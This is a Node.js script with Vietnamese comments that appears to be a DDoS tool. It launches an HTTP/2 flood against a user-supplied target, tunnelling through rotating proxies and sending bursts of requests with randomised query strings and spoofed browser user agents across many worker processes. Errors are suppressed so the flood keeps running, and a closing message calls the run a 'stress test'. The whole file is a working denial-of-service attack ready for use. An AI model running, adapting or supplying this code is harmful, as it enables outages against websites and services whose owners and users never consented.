const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const colors = require('colors');

// Tắt giới hạn Event Emitter để tránh memory leak warning
require("events").EventEmitter.defaultMaxListeners = 0;

// Bỏ qua lỗi để giữ tiến trình chạy liên tục
process.on('uncaughtException', function(er) { 
    // console.error(er); // Tắt log lỗi để tiết kiệm I/O
});
process.on('unhandledRejection', function(er) { 
});

if (process.argv.length < 7) {
    console.log(`\nUsage: node d.cjs [target] [time] [rate] [thread] [proxyfile]\n`.red);
    process.exit();
}

// Cấu hình tham số
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const parsedTarget = url.parse(args.target);

// Load Proxy vào RAM (3TB RAM thoải mái chứa cả tỷ proxy)
const proxies = fs.readFileSync(args.proxyFile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(x => x !== "");

// Các header giả mạo tĩnh để giảm tính toán CPU
const UAs = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
];

// Hàm random nhanh
const randomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
const randomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

if (cluster.isMaster) {
    console.clear();
    console.log(`================================================================`.brightRed);
    console.log(` TARGET   : ${args.target}`.yellow);
    console.log(` CARD MẠNG: 30 Gbps Optimization`.brightGreen);
    console.log(` THREADS  : ${args.threads}`.yellow);
    console.log(` MODE     : HTTP/2 FLOOD (NO RESPONSE WAIT)`.brightCyan);
    console.log(`================================================================`.brightRed);

    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log(`\n[!] Đã hoàn thành Stress Test.`.green);
        process.exit(0);
    }, args.time * 1000);

} else {
    // Worker Process
    startFlood();
}

function startFlood() {
    // Tốc độ xoay vòng proxy cực nhanh
    setInterval(() => {
        const proxy = randomElement(proxies);
        const [pHost, pPort] = proxy.split(":");
        
        // Tạo Tunnel Socket
        const socket = net.connect(Number(pPort), pHost, () => {
            socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        });

        socket.setTimeout(10000);
        socket.setKeepAlive(true, 100000);

        socket.once('data', (chunk) => {
            // Nếu kết nối Proxy thành công (HTTP 200)
            if (chunk.toString().includes("200")) {
                const tlsConn = tls.connect({
                    socket: socket,
                    servername: parsedTarget.host,
                    rejectUnauthorized: false,
                    ALPNProtocols: ['h2'],
                    // Ciphers nhẹ để tối ưu tốc độ mã hóa cho card 30Gbps
                    ciphers: "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256", 
                    secure: true,
                }, () => {
                    if (!tlsConn.alpnProtocol || tlsConn.alpnProtocol !== 'h2') {
                        tlsConn.destroy();
                        return;
                    }

                    const client = http2.connect(parsedTarget.href, {
                        createConnection: () => tlsConn,
                        settings: {
                            initialWindowSize: 6291456,   // Tối ưu window size cho băng thông lớn
                            maxConcurrentStreams: 1000,   // Mở tối đa stream
                            enablePush: false
                        }
                    });

                    client.on('error', () => { client.destroy(); });
                    
                    // Kỹ thuật Flood: Không chờ delay, spam liên tục vào session đã mở
                    const requestLoop = setInterval(() => {
                        if (client.destroyed || client.closed) {
                            clearInterval(requestLoop);
                            return;
                        }

                        for (let i = 0; i < args.Rate; i++) {
                            // Gửi request kiểu Fire-and-Forget (Bắn và Quên)
                            // Không đăng ký sự kiện .on('response') để tiết kiệm CPU
                            const req = client.request({
                                ":method": "GET",
                                ":path": parsedTarget.path + "?Build=" + Math.random().toString(36).substring(2),
                                ":authority": parsedTarget.host,
                                ":scheme": "https",
                                "user-agent": randomElement(UAs),
                                "accept": "*/*",
                                "accept-encoding": "gzip, deflate, br",
                                "cache-control": "no-cache"
                            });
                            
                            req.end(); // Kết thúc request ngay lập tức để đẩy vào đường truyền
                        }
                    }, 50); // Interval cực ngắn để duy trì áp lực
                });

                tlsConn.on('error', () => { tlsConn.destroy(); socket.destroy(); });
                tlsConn.on('end', () => { tlsConn.destroy(); });
            } else {
                socket.destroy();
            }
        });

        socket.on('error', () => { socket.destroy(); });

    }, 20); // Tạo kết nối mới mỗi 20ms
}
